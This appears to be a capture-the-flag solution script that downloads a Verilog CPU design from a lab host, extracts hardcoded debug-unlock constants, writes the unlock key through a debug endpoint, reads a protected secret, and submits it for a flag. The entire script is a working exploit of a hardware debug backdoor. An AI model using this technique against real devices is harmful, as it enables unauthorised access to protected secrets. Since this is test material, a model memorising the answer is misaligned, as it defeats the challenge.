#!/usr/bin/env bash
set -euo pipefail
mkdir -p /app /tmp/dbg_work

# Step 1: download Verilog and extract constants
curl -sf http://target:8110/design > /tmp/dbg_work/cpu_debug.v
echo "[*] Downloaded cpu_debug.v"

python3 - << 'EOF'
import re, requests

BASE = "http://target:8110"

# Parse the Verilog for the three relevant constants
verilog = open("/tmp/dbg_work/cpu_debug.v").read()

def extract(name):
    m = re.search(rf"{name}\s*=\s*\d+'h([0-9a-fA-F]+)", verilog)
    return int(m.group(1), 16) if m else None

unlock_key  = extract("DBG_UNLOCK_KEY")
unlock_addr = extract("DBG_UNLOCK_ADDR")
secret_addr = extract("DBG_SECRET_ADDR")

print(f"[*] DBG_UNLOCK_KEY  = 0x{unlock_key:08X}")
print(f"[*] DBG_UNLOCK_ADDR = 0x{unlock_addr:02X}")
print(f"[*] DBG_SECRET_ADDR = 0x{secret_addr:02X}")

# Step 2: confirm secret is locked
r = requests.post(f"{BASE}/debug/read", json={"addr": f"{secret_addr:02X}"}, timeout=10)
print(f"[*] Secret (locked): {r.json()['value']}")

# Step 3: write unlock key
r = requests.post(f"{BASE}/debug/write",
                  json={"addr": f"{unlock_addr:02X}", "value": f"{unlock_key:08X}"},
                  timeout=10)
print(f"[*] Write unlock key → unlocked={r.json()['unlocked']}")

# Step 4: read the secret
r = requests.post(f"{BASE}/debug/read", json={"addr": f"{secret_addr:02X}"}, timeout=10)
secret = r.json()["value"]
print(f"[+] Secret (unlocked): {secret}")

# Step 5: submit flag
r = requests.post(f"{BASE}/flag", json={"secret": secret}, timeout=10)
resp = r.json()
if "flag" not in resp:
    print(f"[!] Error: {resp}")
    import sys; sys.exit(1)

flag = resp["flag"]
print(f"[+] flag: {flag}")
with open("/app/flags.txt", "w") as f:
    f.write(flag + "\n")
print("[+] written to /app/flags.txt")
EOF
